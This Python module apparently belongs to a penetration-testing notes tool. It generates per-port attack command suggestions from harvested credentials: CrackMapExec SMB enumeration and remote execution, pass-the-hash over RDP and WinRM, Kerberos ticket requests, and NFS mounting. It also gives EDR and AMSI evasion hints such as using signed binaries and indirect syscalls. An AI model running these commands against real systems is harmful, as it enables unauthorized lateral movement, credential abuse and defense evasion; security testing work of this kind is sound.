"""Auditable Living-off-the-Land command suggestions."""

from __future__ import annotations

from pentnote.core.models import DefenseProfile, PayloadContext, WorkspaceCredential

WINDOWS_LOTL = {
    22: [],
    445: [
        "cme smb {host} -u {user} -p {pass} --shares",
        "cme smb {host} -u {user} -p {pass} --sessions",
        "cme smb {host} -u {user} -H {ntlm} --shares",
    ],
    3389: [
        "xfreerdp /u:{user} /p:{pass} /v:{host}",
        "xfreerdp /u:{user} /pth:{ntlm} /v:{host}",
    ],
    5985: [
        "evil-winrm -i {host} -u {user} -p {pass}",
        "evil-winrm -i {host} -u {user} -H {ntlm}",
    ],
    88: [
        "python3 getTGT.py {domain}/{user}:{pass}",
        "python3 getST.py -spn cifs/{host} {domain}/{user}",
    ],
}

LINUX_LOTL = {
    22: [
        "ssh {user}@{host}",
        "ssh -i id_rsa {user}@{host}",
    ],
    80: [
        "gobuster dir -u http://{host} -w /usr/share/wordlists/dirb/common.txt",
        "nikto -h http://{host}",
        "curl -s http://{host}/robots.txt",
    ],
    2049: [
        "showmount -e {host}",
        "mount -t nfs {host}:/ /mnt/nfs",
    ],
}

WINDOWS_GENERIC = {
    445: ["cme smb {host} --shares", "cme smb {host} --sessions"],
    3389: ["xfreerdp /v:{host}"],
    5985: ["evil-winrm -i {host}"],
    88: [
        "python3 getTGT.py {domain}/USER:PASS",
        "python3 getST.py -spn cifs/{host} {domain}/USER",
    ],
}

LOTL_COMMANDS = {
    5985: [
        "evil-winrm -i {host} -u {user} -p {pass} -e /usr/share/evil-winrm/",
        "# Use cmd.exe style commands to reduce AMSI exposure",
    ],
    445: [
        "cme smb {host} -u {user} -p {pass} -x 'whoami'",
        "# Avoid meterpreter - use built-in Windows tools",
        "cme smb {host} -u {user} -p {pass} --exec-method mmcexec",
    ],
}

SAFE_FALLBACK_COMMENT = (
    "# Safe fallback: validate commands in scope and prefer signed, built-in tooling."
)


def generate_lotl_steps(
    context: PayloadContext,
    defenses: DefenseProfile | None = None,
) -> list[str]:
    """Generate target-specific command suggestions from a payload context."""

    defenses = defenses if defenses is not None else context.defenses
    templates = _templates_for_context(context, defenses)
    commands: list[str] = []
    for port in context.open_ports:
        port_templates = templates.get(port, [])
        if context.credentials:
            for credential in context.credentials:
                commands.extend(
                    _render_credential_templates(port_templates, context, credential)
                )
        else:
            commands.extend(_render_generic_templates(port, port_templates, context))
    if defenses.edr_detected:
        commands.append("# EDR detected: " + ", ".join(defenses.edr_detected))
        commands.append("# Consider: LOTL, signed binaries, indirect syscalls")
    commands.append(SAFE_FALLBACK_COMMENT)
    return _dedupe(commands)


def _templates_for_context(
    context: PayloadContext,
    defenses: DefenseProfile,
) -> dict[int, list[str]]:
    if defenses.edr_detected:
        standard = _base_templates_for_context(context)
        for port, commands in LOTL_COMMANDS.items():
            standard[port] = list(commands)
        return standard
    return _base_templates_for_context(context)


def _base_templates_for_context(context: PayloadContext) -> dict[int, list[str]]:
    if (context.os or "").casefold().startswith("windows"):
        return {port: list(templates) for port, templates in WINDOWS_LOTL.items()}
    if (context.os or "").casefold().startswith("linux"):
        return {port: list(templates) for port, templates in LINUX_LOTL.items()}
    combined = {port: list(templates) for port, templates in WINDOWS_LOTL.items()}
    for port, templates in LINUX_LOTL.items():
        combined.setdefault(port, []).extend(templates)
    return combined


def _render_credential_templates(
    templates: list[str],
    context: PayloadContext,
    credential: WorkspaceCredential,
) -> list[str]:
    rendered: list[str] = []
    for template in templates:
        secret_type = credential.secret_type.casefold()
        if "{ntlm}" in template and secret_type != "ntlm":
            continue
        if "{pass}" in template and secret_type != "plaintext":
            continue
        rendered.append(_format_command(template, context, credential))
    return rendered


def _render_generic_templates(
    port: int,
    templates: list[str],
    context: PayloadContext,
) -> list[str]:
    if (context.os or "").casefold().startswith("windows"):
        templates = WINDOWS_GENERIC.get(port, templates)
    credential = WorkspaceCredential(
        username="USER",
        domain=context.domain,
        secret="PASS",
        secret_type="plaintext",
        source_host=context.host_ip,
    )
    return [
        _format_command(template, context, credential)
        for template in templates
        if "{ntlm}" not in template
    ]


def _format_command(
    template: str,
    context: PayloadContext,
    credential: WorkspaceCredential,
) -> str:
    domain = credential.domain or context.domain or "DOMAIN"
    return template.format(
        **{
            "host": context.host_ip,
            "user": credential.username or "USER",
            "pass": credential.secret or "PASS",
            "ntlm": credential.secret or "NTLM_HASH",
            "domain": domain,
        }
    )


def _dedupe(commands: list[str]) -> list[str]:
    return list(dict.fromkeys(commands))
